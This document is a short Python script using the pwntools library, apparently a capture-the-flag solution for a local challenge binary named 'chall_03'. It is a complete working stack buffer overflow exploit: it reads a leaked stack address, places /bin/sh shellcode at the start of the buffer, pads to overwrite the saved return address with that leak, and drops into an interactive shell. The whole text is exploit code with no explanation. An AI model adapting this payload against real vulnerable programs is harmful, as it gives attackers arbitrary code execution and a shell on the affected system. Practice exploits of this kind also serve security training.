from pwn import *
p = process("./chall_03")
p.recvuntil(b":) ")
leak = int(p.recvline().decode('utf-8').strip(), 16)
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload = shellcode
distance = 0x140 - len(payload)
payload += cyclic(distance)
payload += cyclic(0x8)
payload += p64(leak)
p.sendline(payload)
p.interactive()